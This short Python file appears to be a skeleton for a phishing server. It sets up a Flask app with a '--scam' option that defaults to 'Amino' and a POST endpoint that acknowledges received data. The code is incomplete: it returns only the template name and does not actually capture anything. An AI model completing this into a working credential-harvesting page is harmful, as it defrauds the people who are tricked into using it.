from flask import Flask
import click

# The server class has been created; otherwise, when passing the template, 
# it only loads the initial value None, which gives the problem that it doesn't take the flag.
# In this way, we pass when initializing the object, the value of the flag, which forces 
# us to take the name of the template and thus define the html path.
class Server:

    template = None # Name of the te    mplate to be displayed
    app = Flask(__name__) # Initialize flask project

    # default constructor:
    # Global is used instead of self because in the paths there 
    # can be no parameter that does not come by url, giving a conflict when trying to use self.
    def __init__(self, scam):
        global template 
        template = scam

    @app.route('/', methods=['GET'])
    def index():
        global template
        return  template

    @app.route('/', methods=['POST'])
    def data():
        return 'Han llegado los datos!!'

@click.command() # Initialize flag values
@click.option("--scam",  '-s', default="Amino")
@click.option("--port",  '-p', default="5000"  )
def main(scam, port):
    Server(scam).app.run(debug=True, port=port)

if __name__ == '__main__':
    main()